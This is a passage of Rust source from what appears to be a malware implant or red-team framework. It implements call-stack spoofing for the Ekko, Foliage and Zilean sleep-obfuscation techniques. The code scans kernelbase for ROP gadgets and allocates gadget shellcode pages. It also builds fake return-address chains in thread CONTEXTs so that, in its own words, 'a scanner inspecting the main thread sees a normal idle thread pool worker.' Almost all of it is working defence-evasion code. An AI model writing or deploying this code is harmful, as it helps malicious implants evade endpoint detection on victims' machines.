        .NtLockVirtualMemory(-1isize as HANDLE, &mut ptr_addr, &mut ptr_size, VM_LOCK_1);

    api::log_info!(b"[COMMON] alloc_gadget_rbp: ok", code_addr);
    Some(ptr_addr as u64)
}

/// Stack frame sizes for functions used in spoofed call chains.
///
/// Computed from PE `.pdata` unwind information via the `uwd` crate.
#[cfg(any(
    feature = "sleep-ekko",
    feature = "sleep-foliage",
    feature = "sleep-zilean"
))]
#[derive(Default, Debug, Clone, Copy)]
pub struct FrameSizes {
    /// Frame size of `BaseThreadInitThunk` (kernel32).
    pub base_thread_size: u32,
    /// Frame size of `RtlUserThreadStart` (ntdll).
    pub rtl_user_thread_size: u32,
    /// Frame size of `EnumDateFormatsExA` (kernel32).
    pub enum_date_size: u32,
    /// Frame size of `RtlAcquireSRWLockExclusive` (ntdll).
    pub rtl_acquire_srw_size: u32,
}

/// Resolve stack frame sizes for the four functions used in spoofed call chains.
///
/// Parses `.pdata` (exception directory) of ntdll and kernel32 to compute unwind
/// frame sizes for `RtlUserThreadStart`, `BaseThreadInitThunk`, `EnumDateFormatsExA`,
/// and `RtlAcquireSRWLockExclusive`.
///
/// # Arguments
///
/// * `api` - Resolved API with module handles for ntdll and kernel32, plus function pointers
///   for `RtlUserThreadStart`, `BaseThreadInitThunk`, `EnumDateFormatsExA`, and
///   `RtlAcquireSRWLockExclusive`.
///
/// # Returns
///
/// `Some(FrameSizes)` with all four frame sizes, or `None` if any lookup fails.
///
/// # Safety
///
/// `Api` module handles must point to valid loaded DLLs.
#[cfg(any(
    feature = "sleep-ekko",
    feature = "sleep-foliage",
    feature = "sleep-zilean"
))]
#[link_section = ".text$D"]
pub unsafe fn resolve_frame_sizes(api: &Api) -> Option<FrameSizes> {
    let ntdll_base = api.ntdll.handle;
    let k32_base = api.kernel32.handle;

    // Step 1) Find .pdata (exception directory) for both modules
    let (ntdll_pdata, ntdll_count) = uwd::stack::find_pdata(ntdll_base as *mut u8)?;
    let (k32_pdata, k32_count) = uwd::stack::find_pdata(k32_base as *mut u8)?;

    // Step 2) Resolve RtlUserThreadStart frame size from ntdll
    let rtl_user_rva = (api.ntdll.RtlUserThreadStart_ptr as usize - ntdll_base) as u32;
    let rtl_user_entry = uwd::stack::find_runtime_entry(rtl_user_rva, ntdll_pdata, ntdll_count)?;
    let rtl_user_thread_size = uwd::stack::get_frame_size(ntdll_base, &*rtl_user_entry)?;

    // Step 3) Resolve BaseThreadInitThunk frame size from kernel32
    let base_thread_rva = (api.kernel32.BaseThreadInitThunk_ptr as usize - k32_base) as u32;
    let base_thread_entry = uwd::stack::find_runtime_entry(base_thread_rva, k32_pdata, k32_count)?;
    let base_thread_size = uwd::stack::get_frame_size(k32_base, &*base_thread_entry)?;

    // Step 4) Resolve EnumDateFormatsExA frame size from kernel32
    let enum_date_rva = (api.kernel32.EnumDateFormatsExA_ptr as usize - k32_base) as u32;
    let enum_date_entry = uwd::stack::find_runtime_entry(enum_date_rva, k32_pdata, k32_count)?;
    let enum_date_size = uwd::stack::get_frame_size(k32_base, &*enum_date_entry)?;

    // Step 5) Resolve RtlAcquireSRWLockExclusive frame size from ntdll
    let rtl_acquire_rva = (api.ntdll.RtlAcquireSRWLockExclusive_ptr as usize - ntdll_base) as u32;
    let rtl_acquire_entry =
        uwd::stack::find_runtime_entry(rtl_acquire_rva, ntdll_pdata, ntdll_count)?;
    let rtl_acquire_srw_size = uwd::stack::get_frame_size(ntdll_base, &*rtl_acquire_entry)?;

    Some(FrameSizes {
        base_thread_size,
        rtl_user_thread_size,
        enum_date_size,
        rtl_acquire_srw_size,
    })
}

/// Scan kernelbase for an `add rsp, 0x58; ret` gadget (`48 83 C4 58 C3`).
///
/// # Arguments
///
/// * `api` - Resolved API with `api.kernelbase.handle` pointing to a loaded kernelbase.
///
/// # Returns
///
/// `Some((gadget_addr, frame_size))` or `None` if the gadget is not found.
///
/// # Safety
///
/// `api.kernelbase.handle` must be a valid loaded module base.
#[cfg(any(
    feature = "sleep-ekko",
    feature = "sleep-foliage",
    feature = "sleep-zilean"
))]
#[link_section = ".text$D"]
pub unsafe fn scan_add_rsp_ret(api: &Api) -> Option<(u64, u32)> {
    let kb_base = api.kernelbase.handle;
    let (pdata, pdata_count) = uwd::stack::find_pdata(kb_base as *mut u8)?;

    // The gadget's `add rsp, N` immediate MUST equal the frame size used to space
    // the fake return-address slots - find_self_sized_add_rsp_gadget guarantees
    // this by matching each function's own frame size. A hardcoded 0x58 pattern
    // paired with an unrelated frame size desyncs execution from the layout and
    // crashes the NtContinue chain on the first returning step.
    let result = uwd::stack::find_self_sized_add_rsp_gadget(kb_base, pdata, pdata_count)?;

    Some((result.address as u64, result.frame_size))
}

/// Scan kernelbase for a `call [rbx]` (`FF 13`) or `jmp [rbx]` (`FF 23`) gadget.
///
/// # Arguments
///
/// * `api` - Resolved API with `api.kernelbase.handle` pointing to a loaded kernelbase.
/// * `kind` - Which gadget pattern to scan for.
///
/// # Returns
///
/// `Some((gadget_addr, frame_size))` or `None` if the gadget is not found.
///
/// # Safety
///
/// `api.kernelbase.handle` must be a valid loaded module base.
#[cfg(any(
    feature = "sleep-ekko",
    feature = "sleep-foliage",
    feature = "sleep-zilean"
))]
#[link_section = ".text$D"]
pub unsafe fn scan_jmp_rbx(api: &Api, kind: GadgetKind) -> Option<(u64, u32)> {
    let kb_base = api.kernelbase.handle;
    let (pdata, pdata_count) = uwd::stack::find_pdata(kb_base as *mut u8)?;

    let pattern = match kind {
        GadgetKind::Call => &[0xFF, 0x13][..], // call [rbx]
        GadgetKind::Jmp => &[0xFF, 0x23][..],  // jmp [rbx]
    };

    let result = uwd::stack::find_gadget(kb_base, pattern, pdata, pdata_count)?;
    Some((result.address as u64, result.frame_size))
}

/// Complete stack spoofing configuration: gadgets, frame sizes, and addresses.
#[cfg(any(
    feature = "sleep-ekko",
    feature = "sleep-foliage",
    feature = "sleep-zilean"
))]
#[derive(Clone, Copy, Debug)]
pub struct SpoofConfig {
    /// Pointer page for the `mov rsp, rbp; ret` shellcode (ctx.Rbx target).
    pub gadget_rbp: u64,
    /// Whether the RBX gadget is `call [rbx]` or `jmp [rbx]`.
    pub gadget_kind: GadgetKind,
    /// Stack frame sizes for spoofed return address chain functions.
    pub frames: FrameSizes,
    /// Address of `add rsp, 0x58; ret` gadget in kernelbase.
    pub add_rsp_addr: u64,
    /// Frame size of the function containing the `add rsp` gadget.
    pub add_rsp_size: u32,
    /// Address of `call/jmp [rbx]` gadget in kernelbase.
    pub jmp_rbx_addr: u64,
    /// Frame size of the function containing the `jmp/call [rbx]` gadget.
    pub jmp_rbx_size: u32,
}

/// Initialize the full stack spoofing configuration.
///
/// # Arguments
///
/// * `api` - Resolved API with all module handles and function pointers.
///
/// # Returns
///
/// `Some(SpoofConfig)` with all resolved gadgets and frame sizes, or `None` if any step fails.
///
/// # Safety
///
/// All `Api` module handles and function pointers must be resolved.
#[cfg(any(
    feature = "sleep-ekko",
    feature = "sleep-foliage",
    feature = "sleep-zilean"
))]
#[link_section = ".text$D"]
pub unsafe fn init_spoof_config(api: &mut Api) -> Option<SpoofConfig> {
    // Step 1) Detect call [rbx] vs jmp [rbx] gadget kind in kernelbase
    let kind = detect_gadget_kind(api)?;
    api::log_info!(b"[COMMON] gadget kind detected");

    // Step 2) Allocate the gadget-rbp shellcode pages (mov rsp, rbp; ret)
    let gadget_rbp = alloc_gadget_rbp(api, kind)?;
    api::log_info!(b"[COMMON] gadget_rbp allocated");

    // Step 3) Resolve frame sizes from PE .pdata unwind info
    let frames = resolve_frame_sizes(api)?;
    api::log_info!(b"[COMMON] frame sizes resolved");

    // Step 4) Find add rsp, 0x58; ret gadget in kernelbase
    let (add_rsp_addr, add_rsp_size) = scan_add_rsp_ret(api)?;
    api::log_info!(b"[COMMON] add_rsp gadget found");

    // Step 5) Find call/jmp [rbx] gadget in kernelbase
    let (jmp_rbx_addr, jmp_rbx_size) = scan_jmp_rbx(api, kind)?;
    api::log_info!(b"[COMMON] jmp_rbx gadget found");

    Some(SpoofConfig {
        gadget_rbp,
        gadget_kind: kind,
        frames,
        add_rsp_addr,
        add_rsp_size,
        jmp_rbx_addr,
        jmp_rbx_size,
    })
}

/// Build a spoofed CONTEXT for the main thread that looks like an idle worker.
///
/// Sets `Rip` to `ZwWaitForWorkViaWorkerFactory` and constructs a fake stack:
/// ```text
/// Rsp -->  RtlAcquireSRWLockExclusive + 0x17
///          (srw_frame_size padding)
///          BaseThreadInitThunk + 0x14
///          (base_thread_frame_size padding)
///          RtlUserThreadStart + 0x21
///          (rtl_user_frame_size padding)
///          0x0000000000000000              ; stack terminator
/// ```
///
/// A scanner inspecting the main thread sees a normal idle thread pool worker.
///
/// # Arguments
///
/// * `api` - Resolved API with function pointers for the spoofed call chain targets.
/// * `scfg` - Stack spoofing config with resolved frame sizes.
/// * `ctx` - The real thread context (used to derive Rsp for the spoofed stack).
///
/// # Returns
///
/// A new `CONTEXT` with `Rip` pointing at `ZwWaitForWorkViaWorkerFactory` and a
/// fake stack that mimics an idle Windows worker thread.
///
/// # Safety
///
/// The spoofed stack area (`ctx.Rsp - 0x5000`) must be mapped writable memory.
#[cfg(any(
    feature = "sleep-ekko",
    feature = "sleep-foliage",
    feature = "sleep-zilean"
))]
#[link_section = ".text$D"]
pub unsafe fn spoof_context(api: &Api, scfg: &SpoofConfig, ctx: CONTEXT) -> CONTEXT {
    let mut ctx_spoof: CONTEXT = zeroed();
    ctx_spoof.ContextFlags = CONTEXT_FULL;

    // Step 1) Set Rip to look like an idle thread pool worker
    ctx_spoof.Rip = api.ntdll.ZwWaitForWorkViaWorkerFactory_ptr as u64;

    // Step 2) Position Rsp well below real stack to avoid overlap
    let f = &scfg.frames;
    ctx_spoof.Rsp = (ctx.Rsp - 0x1000 * 5)
        - (f.rtl_user_thread_size + f.base_thread_size + f.rtl_acquire_srw_size + 32) as u64;

    // Step 3) Write fake return address chain (bottom-up, stack grows down):
    // [Rsp+0]                  -> RtlAcquireSRWLockExclusive+0x17 (lock acquisition)
    *(ctx_spoof.Rsp as *mut u64) = api.ntdll.RtlAcquireSRWLockExclusive_ptr as u64 + 0x17;

    // [Rsp + srw_size + 8]    -> BaseThreadInitThunk+0x14 (thread init)
    *((ctx_spoof.Rsp + (f.rtl_acquire_srw_size + 8) as u64) as *mut u64) =
        api.kernel32.BaseThreadInitThunk_ptr as u64 + 0x14;

    // [Rsp + srw + base + 16] -> RtlUserThreadStart+0x21 (thread entry)
    *((ctx_spoof.Rsp + (f.rtl_acquire_srw_size + f.base_thread_size + 16) as u64) as *mut u64) =
        api.ntdll.RtlUserThreadStart_ptr as u64 + 0x21;

    // [Rsp + srw + base + rtl + 24] -> 0 (stack terminator, unwinder stops here)
    *((ctx_spoof.Rsp
        + (f.rtl_acquire_srw_size + f.base_thread_size + f.rtl_user_thread_size + 24) as u64)
        as *mut u64) = 0;

    ctx_spoof
}

/// Dispatch variant for stack layout spoofing.
#[cfg(any(
    feature = "sleep-ekko",
    feature = "sleep-foliage",
    feature = "sleep-zilean"
))]
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum SpoofKind {
    /// Ekko: timer-based, writes nothing special at stack top.
    Timer,
    /// Zilean: wait-based, same as Timer.
    Wait,
    /// Foliage: APC-based, writes `NtTestAlert` at original Rsp before spoofing.
    Foliage,
}

/// Build a fake call stack for each of the 10 chain contexts.
///
/// Plants return addresses that make the stack look like a normal Win32 API callback
/// thread. After the target NT function returns, the stack unwinds through:
///
/// ```text
/// ctx.Rsp -->  add_rsp_ret gadget        ; "return" from target function
///              (add_rsp_size padding)     ; frame for add_rsp gadget
///              jmp_rbx gadget             ; "return" from add_rsp
///              (jmp_rbx_size padding)     ; frame for jmp_rbx gadget
///              EnumDateFormatsExA + 0x17  ; looks like API callback
///              (enum_date_size padding)
///              BaseThreadInitThunk + 0x14 ; looks like thread init
///              (base_thread_size padding)
///              RtlUserThreadStart + 0x21  ; looks like thread entry
///              0x0000000000000000         ; stack terminator
/// ```
///
/// For `SpoofKind::Foliage`, writes `NtTestAlert` at the original Rsp before
/// relocating, matching the APC delivery call chain.
///
/// # Arguments
///
/// * `api` - Resolved API with function pointers for the spoofed return addresses.
/// * `ctxs` - Array of 10 CONTEXTs to apply the fake stack layout to.
/// * `scfg` - Stack spoofing config with gadget addresses and frame sizes.
/// * `kind` - The dispatch variant (`Timer`, `Wait`, or `Foliage`).
///
/// # Safety
///
/// The stack area below each context's Rsp must be mapped writable memory.
/// The spoofing config addresses must be valid.
#[cfg(any(
    feature = "sleep-ekko",
    feature = "sleep-foliage",
    feature = "sleep-zilean"
))]
#[link_section = ".text$D"]
pub unsafe fn spoof_stack_layout(
    api: &Api,
    ctxs: &mut [CONTEXT; 10],
    scfg: &SpoofConfig,
    kind: SpoofKind,
) {
    let f = &scfg.frames;

    let total = (f.rtl_user_thread_size
        + f.base_thread_size
        + f.enum_date_size
        + scfg.jmp_rbx_size
        + scfg.add_rsp_size
        + 48) as u64;

    for ctx in ctxs.iter_mut() {
        // Step 1) Save original Rsp in Rbp (restored later by gadget_rbp shellcode).
        // For Foliage, also write NtTestAlert at stack top (APC delivery goes through
        // NtTestAlert, so the call chain looks natural for an APC thread).
        match kind {
            SpoofKind::Timer | SpoofKind::Wait => {
                ctx.Rbp = ctx.Rsp;
            }
            SpoofKind::Foliage => {
                (ctx.Rsp as *mut u64).write(api.ntdll.NtTestAlert_ptr as u64);
                ctx.Rbp = ctx.Rsp;
            }
        }

        // Step 2) Set Rbx to the pointer page (call/jmp [rbx] -> shellcode page)
        ctx.Rbx = scfg.gadget_rbp;

        // Step 3) Relocate Rsp far below to make room for the fake stack layout
        ctx.Rsp = (ctx.Rsp - 0x1000 * 10) - total;

        // Ensure 16-byte stack alignment
        if ctx.Rsp % 16 != 0 {
            ctx.Rsp -= 8;
        }

        // Step 4) Write the fake return address chain (stack grows down, lowest address at top):
        // [Rsp+0]: add_rsp_ret gadget - target function "returns" here
        *(ctx.Rsp as *mut u64) = scfg.add_rsp_addr;

        // [Rsp + add_rsp_size + 8]: jmp_rbx gadget - add_rsp "returns" here
        *((ctx.Rsp + (scfg.add_rsp_size + 8) as u64) as *mut u64) = scfg.jmp_rbx_addr;

        // [Rsp + add_rsp + jmp_rbx + 16]: EnumDateFormatsExA+0x17 - looks like API callback
        *((ctx.Rsp + (scfg.add_rsp_size + scfg.jmp_rbx_size + 16) as u64) as *mut u64) =
            api.kernel32.EnumDateFormatsExA_ptr as u64 + 0x17;

        // [Rsp + ... + enum_date + 24]: BaseThreadInitThunk+0x14 - thread init frame
        *((ctx.Rsp + (f.enum_date_size + scfg.jmp_rbx_size + scfg.add_rsp_size + 24) as u64)
            as *mut u64) = api.kernel32.BaseThreadInitThunk_ptr as u64 + 0x14;

        // [Rsp + ... + base_thread + 32]: RtlUserThreadStart+0x21 - thread entry frame
        *((ctx.Rsp
            + (f.enum_date_size + f.base_thread_size + scfg.jmp_rbx_size + scfg.add_rsp_size + 32)
                as u64) as *mut u64) = api.ntdll.RtlUserThreadStart_ptr as u64 + 0x21;

        // [Rsp + ... + rtl_user + 40]: 0 - stack terminator (unwinder stops here)
        *((ctx.Rsp
            + (f.enum_date_size
                + f.base_thread_size
                + f.rtl_user_thread_size
                + scfg.jmp_rbx_size
                + scfg.add_rsp_size
                + 40) as u64) as *mut u64) = 0;
    }
}

/// Read the current stack pointer (RSP) via inline assembly.
///
/// # Returns
///
/// The current value of the RSP register.
#[cfg(any(
    feature = "sleep-ekko",
    feature = "sleep-foliage",
    feature = "sleep-zilean"
))]
#[inline]
pub fn current_rsp() -> u64 {
    let rsp: u64;
    unsafe { core::arch::asm!("mov {}, rsp", out(reg) rsp) };
    rsp
}
